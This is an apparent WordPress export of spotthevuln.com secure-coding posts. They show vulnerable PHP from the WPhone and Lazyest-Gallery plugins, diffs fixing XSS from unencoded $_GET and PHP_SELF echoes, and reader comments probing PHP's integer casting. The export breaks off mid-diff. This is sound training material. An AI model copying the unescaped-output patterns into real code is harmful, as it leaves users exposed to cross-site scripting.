			<wp:comment_content><![CDATA[[...] Success in increasing code quality comes from making it very difficult for a developer to do the wrong thing, making sure that the path of least resistance is also the most correct path.  Unfortunately as some programming languages have come to be used as much by designers and artists than the more mathematically included coder of old, a mindset of working around the coder and giving them results that they expect rather than what they&#8217;ve asked for has become common.  This leads the developers to think they&#8217;re doing the right thing, while actually shooting themselves in the foot.  A friend of mine (hat tip to @suburbsec) pointed me to a very good example of this the other day on one of spotthevuln.com&#8217;s latest entries. [...] ]]></wp:comment_content>
			<wp:comment_approved>0</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1339296315.2094";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1815</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/03/invincible-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-03-25 05:37:29</wp:comment_date>
			<wp:comment_date_gmt>2011-03-25 12:37:29</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Invincible [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301056649.0631";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301076827.7019";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2154</wp:comment_id>
			<wp:comment_author><![CDATA[Validating validation]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://www.varanoid.com/security-vendors/barracuda-labs/validating-validation/</wp:comment_author_url>
			<wp:comment_author_IP>74.208.16.213</wp:comment_author_IP>
			<wp:comment_date>2011-08-10 00:08:44</wp:comment_date>
			<wp:comment_date_gmt>2011-08-10 07:08:44</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Success in increasing code quality comes from making it very difficult for a developer to do the wrong thing, making sure that the path of least resistance is also the most correct path.  Unfortunately as some programming languages have come to be used as much by designers and artists than the more mathematically included coder of old, a mindset of working around the coder and giving them results that they expect rather than what they’ve asked for has become common.  This leads the developers to think they’re doing the right thing, while actually shooting themselves in the foot.  A friend of mine (hat tip to @suburbsec) pointed me to a very good example of this the other day on one of spotthevuln.com’s latest entries. [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1319567564.2869";s:7:"message";s:45:"BrettH changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312960124.5168";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Invincible - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/03/invincible-cross-site-scripting/</link>
		<pubDate>Fri, 25 Mar 2011 12:30:44 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1395</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: WPhone Plug-in

Fixed in Version: 1.5.2

Issue Type: Cross Site Scripting (XSS)

Original Code: <a href="http://spotthevuln.com/2011/03/invincible/">Found Here</a>
<h1>Details</h1>
This bug is a straightforward XSS bug.  Once again, we see the familiar $_SERVER['PHP_SELF'] variable being echoed back to the user without any encoding.  The fix is simple, remove the value for the ACTION form attribute completely.  This removes the need for any type of sanitization and ensures the form is POSTed to the URL that is hosting the form.

On a side note, many developers reduce the testing/defenses implemented in web pages designed for mobile clients.  For some reason, it’s tempting to assume web pages designed for mobile applications have less exposure.  Less exposure is obviously not the case; web pages designed for mobile clients have just as much exposure as web pages designed for normal web browsers.  Please ensure your security diligence and security test cases cover your mobile attack surface.  Just because the devices are smaller, that doesn’t make your attack surface is smaller too!

<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="49,50"]
&lt;?php

# Visit this file in your browser to simulate a mobile device's screensize via an &lt;iframe&gt;

$devices = array(
	'iphone_p' =&gt; array(
		'type'   =&gt; 'iPhone: portrait (320x480)',
		'width'  =&gt; 320,
		'height' =&gt; 480
	),
	'iphone_l' =&gt; array(
		'type'   =&gt; 'iPhone: landscape (480x320)',
		'width'  =&gt; 480,
		'height' =&gt; 320
	),
	'moto'	   =&gt; array(
		'type'   =&gt; 'Motorola phone/browser (RAZR, v551, etc)',
		'width'  =&gt; 176,
		'height' =&gt; 220
	),
	'n80'	   =&gt; array(
		'type'   =&gt; 'Nokia N80 (N60WebKit)',
		'width'  =&gt; 352,
		'height' =&gt; 416
	)
);

if ( (int) $_REQUEST['w'] &amp;&amp; (int) $_REQUEST['h'] ) {
	$choice = array(
		'type'   =&gt; &quot;Custom size ({$_REQUEST['w']}x{$_REQUEST['h']})&quot;,
		'width'  =&gt; $_REQUEST['w'],
		'height' =&gt; $_REQUEST['h']
	);
}

elseif ( $devices[$_REQUEST['d']] )
	$choice = $devices[$_REQUEST['d']];

else $choice = $devices['iphone_p'];

?&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
	&lt;title&gt;WPhone iFramer test tool: &lt;?php echo $choice['type']; ?&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
-	&lt;form action=&quot;&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;&quot; method=&quot;get&quot;&gt;
+   &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; 
		&lt;label for=&quot;h&quot;&gt;CHOOSE&lt;/label&gt;
		&lt;select name=&quot;d&quot; id=&quot;d&quot;&gt;
			&lt;option&gt;&lt;/option&gt;
&lt;?php
			foreach ( $devices as $this_d_key =&gt; $this_d ) {
				$selected = ( $_REQUEST['d'] == $this_d_key ) ? 'selected' : '';
				echo '&lt;option value=&quot;' . $this_d_key . '&quot; ' . $selected . '&gt;' . $this_d['type'] . '&lt;/option&gt;' . &quot;\n\t\t\t&quot;;
			}
			echo &quot;\n&quot;;
?&gt;		
		&lt;/select&gt;
		&lt;br /&gt;OR INPUT
		&lt;label for=&quot;w&quot;&gt;Width&lt;/label&gt;
		&lt;input type=&quot;text&quot; name=&quot;w&quot; id=&quot;w&quot; value=&quot;&quot; size=&quot;5&quot; /&gt;
		x
		&lt;label for=&quot;h&quot;&gt;Height&lt;/label&gt;
		&lt;input type=&quot;text&quot; name=&quot;h&quot; id=&quot;h&quot; value=&quot;&quot; size=&quot;5&quot; /&gt;
		&lt;br /&gt;
		&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;view&quot; /&gt;
	&lt;/form&gt;
	&lt;h2&gt;&lt;?php echo $choice['type']; ?&gt;&lt;/h2&gt;
	&lt;iframe src=&quot;../../../wp-login.php&quot; width=&quot;&lt;?php echo $choice['width']; ?&gt;&quot; height=&quot;&lt;?php echo $choice['height']; ?&gt;&quot;&gt;your browser does not support iframes.&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1395</wp:post_id>
		<wp:post_date>2011-03-25 05:30:44</wp:post_date>
		<wp:post_date_gmt>2011-03-25 12:30:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>invincible-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="post_tag" nicename="mobile"><![CDATA[mobile]]></category>
		<category domain="post_tag" nicename="mobile-clients"><![CDATA[mobile clients]]></category>
		<category domain="post_tag" nicename="phone-browser"><![CDATA[phone browser]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1823</wp:comment_id>
			<wp:comment_author><![CDATA[Jacob]]></wp:comment_author>
			<wp:comment_author_email>jacob.kitchel@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>98.226.63.238</wp:comment_author_IP>
			<wp:comment_date>2011-03-25 19:01:41</wp:comment_date>
			<wp:comment_date_gmt>2011-03-26 02:01:41</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[The cast bug tough because I've never written/audited PHP before so it was all Greek to me. What threw me for a loop was how the cast worked on the following test strings: '0string', and '1string', and '-1string'. *Interesting*, to say the least.

For example:
php &gt; $hw = array("w" =&gt; 300, "h" =&gt; 450);
php &gt; if((int) $hw['w'] &amp;&amp; (int) $hw['h']) {
php { echo $hw['h']; }
450
php &gt; $hw = array("w" =&gt; 300, "h" =&gt; "string");
php &gt; if((int) $hw['w'] &amp;&amp; (int) $hw['h']) {
php { echo $hw['h']; }
php &gt;
php &gt; $hw = array("w" =&gt; 300, "h" =&gt; "0string");
php &gt; if((int) $hw['w'] &amp;&amp; (int) $hw['h']) {
php { echo $hw['h']; }
php &gt;
php &gt; $hw = array("w" =&gt; 300, "h" =&gt; "1string");
php &gt; if((int) $hw['w'] &amp;&amp; (int) $hw['h']) {
php { echo $hw['h']; }
1string
php &gt; $hw = array("w" =&gt; 300, "h" =&gt; "-1string");
php &gt; if((int) $hw['w'] &amp;&amp; (int) $hw['h']) {
php { echo $hw['h']; }
-1string]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301104901.1633";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301105486.9589";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1819</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>216.239.45.4</wp:comment_author_IP>
			<wp:comment_date>2011-03-25 11:16:45</wp:comment_date>
			<wp:comment_date_gmt>2011-03-25 18:16:45</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[There is indeed :)  It was fixed in a different patch!  Good catch!]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>1816</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301077005.0883";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1816</wp:comment_id>
			<wp:comment_author><![CDATA[Neal]]></wp:comment_author>
			<wp:comment_author_email>blog@nealpoole.com</wp:comment_author_email>
			<wp:comment_author_url>http://nealpoole.com</wp:comment_author_url>
			<wp:comment_author_IP>184.74.199.18</wp:comment_author_IP>
			<wp:comment_date>2011-03-25 07:34:06</wp:comment_date>
			<wp:comment_date_gmt>2011-03-25 14:34:06</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Isn't there another XSS vulnerability here?

On line 28, we have an if statement where $_REQUEST variables are cast to ints. $_REQUEST doesn't store the result of the cast, though: that means it's possible to provide malformed input that breaks out of the iframe tag.

I wrote a simple script to demonstrate what I'm talking about: the code is at https://gist.github.com/886922.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1301063646.943";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301076816.2425";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1821</wp:comment_id>
			<wp:comment_author><![CDATA[Jacob]]></wp:comment_author>
			<wp:comment_author_email>jacob.kitchel@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>98.226.63.238</wp:comment_author_IP>
			<wp:comment_date>2011-03-25 15:38:24</wp:comment_date>
			<wp:comment_date_gmt>2011-03-25 22:38:24</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Looks like I'm late to the party on the cast vuln. That's the one that I originally found and missed the $_SERVER['PHP_SELF'] XSS. That'll teach me to look for just one vuln in these examples.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301092704.8101";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301093339.6529";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1822</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>216.239.45.4</wp:comment_author_IP>
			<wp:comment_date>2011-03-25 15:52:09</wp:comment_date>
			<wp:comment_date_gmt>2011-03-25 22:52:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I thought the cast/$_REQUEST bug was tougher to spot, so good job.  The various operations on the $_REQUEST variables made it feel like the variable could only contain numeric values, however there were no such enforcements in the code (as Neal pointed out).]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>1821</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301093529.7844";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Proportion </title>
		<link>http://spotthevuln.com/2011/03/proportion/</link>
		<pubDate>Mon, 28 Mar 2011 12:30:00 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1401</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Rocket science has been mythologized all out of proportion to its true difficulty.
John Carmack</strong></blockquote>
[sourcecode language="php"]
&lt;?php

	// Don't remove this lines:
	require_once('../../../wp-blog-header.php');
	global $lg_gallery;

?&gt;

&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.1//EN&quot; &quot;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&quot;&gt;

&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;

	&lt;head&gt;

		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;&lt;?php bloginfo('html_type'); ?&gt;; charset=&lt;?php bloginfo('charset'); ?&gt;&quot; /&gt;
		&lt;meta name=&quot;generator&quot; content=&quot;WordPress &lt;?php bloginfo('version'); ?&gt;&quot; /&gt;

		&lt;title&gt;&lt;?php echo $_GET['image'] ?&gt;&lt;/title&gt;
		
		&lt;style type=&quot;text/css&quot;&gt;
			body {
				text-align:center;
				margin:0;
				padding:0;
			}
			img {
				border:none;
			}
		&lt;/style&gt;
		&lt;script type=&quot;text/javascript&quot;&gt;
		function WinWidth()	{
			if (window.innerWidth!=window.undefined) return window.innerWidth; 
			if (document.compatMode=='CSS1Compat') return document.documentElement.clientWidth; 
			if (document.body) return document.body.clientWidth; 
			return window.undefined; 
		}
		
		function WinHeight() {
			if (window.innerHeight!=window.undefined) return window.innerHeight; 
			if (document.compatMode=='CSS1Compat') return document.documentElement.clientHeight; 
			if (document.body) return document.body.clientHeight; 
			return window.undefined; 
		}
		
		function FitPic() { 
			iWidth=WinWidth();
			iHeight=WinHeight();
			iWidth = document.images[0].width - iWidth; 
			iHeight = document.images[0].height - iHeight; 
			window.resizeBy((iWidth), (iHeight))
			self.focus(); 
		} 

		&lt;/script&gt;
	&lt;/head&gt;

	&lt;body onload=&quot;FitPic()&quot;&gt;
		&lt;a href=&quot;javascript:self.close()&quot; title=&quot;&lt;?php _e('Click to close', $lg_text_domain); ?&gt;&quot;&gt;
			&lt;img src=&quot;&lt;?php echo str_replace(&quot; &quot;, &quot;%20&quot;, $lg_gallery-&gt;address.$_GET['folder'].$_GET['image']); ?&gt;&quot; alt=&quot;&lt;?php echo $_GET['image']; ?&gt;&quot; /&gt;
		&lt;/a&gt;
	&lt;/body&gt;
&lt;/html&gt;

&lt;?php

?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1401</wp:post_id>
		<wp:post_date>2011-03-28 05:30:00</wp:post_date>
		<wp:post_date_gmt>2011-03-28 12:30:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>proportion</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1859</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/04/proportion-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-04-01 05:33:30</wp:comment_date>
			<wp:comment_date_gmt>2011-04-01 12:33:30</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Proportion [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301806982.7435";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301661210.9176";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Proportion - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/04/proportion-cross-site-scripting/</link>
		<pubDate>Fri, 01 Apr 2011 12:30:26 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1404</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Lazyest-Gallery

Fixed in Version: 0.9

Issue Type: Cross Site Scripting (XSS)

Original Code: <a href="http://spotthevuln.com/2011/03/proportion/">Found Here</a>
<h1>Details</h1>
For most security issues, I give the developer the benefit of the doubt.  It’s tough to keep track of all the corner cases and security nuances.  For this diff however, there is no excuse. 

First, let’s cover what the patch fixes.  On line 18, the developer was taking a tainted value passed via query string parameter and using that value to build HTML markup.  This is XSS in its most classic form.  Also, on line 58 the same tainted input is used to build the SRC attribute for an image tag, also resulting in XSS.  The developer chose to encode both of these tainted values before using them in the HTML output.

Now, let’s talk about the problems with this patch.  First, the tainted value used to build the SRC attribute for an image tag needs additional validation.  SRC attributes are tricky as they usually cause the browser to issue a request.  Escaping the tainted SRC value only prevents the attacker from breaking out of the attribute and injecting their own HTML.  Escaping doesn’t prevent the attacker from passing a well formed URI like javascript:javascript-payload-here.  I can let the developer slide on this one… chalk it up as a lesson on corner cases.  Now, if you look at the patched line, you’ll see that the ALT attribute for the same image tag also contains a XSS vulnerability.  Yes, the developer missed a XSS vulnerability that is less than 5 characters away from a fixed XSS vulnerability.  This also shows that the developer never tested the patch.  The tainted query string parameter is the same for all the vulnerable sections.  If the developer tried to test this patch, they would have discovered they were still exposed…

<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="18,19,59,60"]
&lt;?php

	// Don't remove this lines:
	require_once('../../../wp-blog-header.php');
	global $lg_gallery;

?&gt;

&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.1//EN&quot; &quot;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&quot;&gt;

&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;

	&lt;head&gt;

		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;&lt;?php bloginfo('html_type'); ?&gt;; charset=&lt;?php bloginfo('charset'); ?&gt;&quot; /&gt;
		&lt;meta name=&quot;generator&quot; content=&quot;WordPress &lt;?php bloginfo('version'); ?&gt;&quot; /&gt;

-		&lt;title&gt;&lt;?php echo $_GET['image'] ?&gt;&lt;/title&gt;
+		&lt;title&gt;&lt;?php echo esc_html($_GET['image']) ?&gt;&lt;/title&gt; 
		&lt;style type=&quot;text/css&quot;&gt;
			body {
				text-align:center;
				margin:0;
				padding:0;
			}
			img {
				border:none;
			}
		&lt;/style&gt;
		&lt;script type=&quot;text/javascript&quot;&gt;
		function WinWidth()	{
			if (window.innerWidth!=window.undefined) return window.innerWidth; 
			if (document.compatMode=='CSS1Compat') return document.documentElement.clientWidth; 
			if (document.body) return document.body.clientWidth; 
			return window.undefined; 
		}
		
		function WinHeight() {
			if (window.innerHeight!=window.undefined) return window.innerHeight; 
			if (document.compatMode=='CSS1Compat') return document.documentElement.clientHeight; 
			if (document.body) return document.body.clientHeight; 
			return window.undefined; 
		}
		
		function FitPic() { 
			iWidth=WinWidth();
			iHeight=WinHeight();
			iWidth = document.images[0].width - iWidth; 
			iHeight = document.images[0].height - iHeight; 
			window.resizeBy((iWidth), (iHeight))
			self.focus(); 
		} 

		&lt;/script&gt;
	&lt;/head&gt;

	&lt;body onload=&quot;FitPic()&quot;&gt;
		&lt;a href=&quot;javascript:self.close()&quot; title=&quot;&lt;?php _e('Click to close', $lg_text_domain); ?&gt;&quot;&gt;
-			&lt;img src=&quot;&lt;?php echo str_replace(&quot; &quot;, &quot;%20&quot;, $lg_gallery-&gt;address.$_GET['folder'].$_GET['image']); ?&gt;&quot; alt=&quot;&lt;?php echo $_GET['image']; ?&gt;&quot; /&gt;
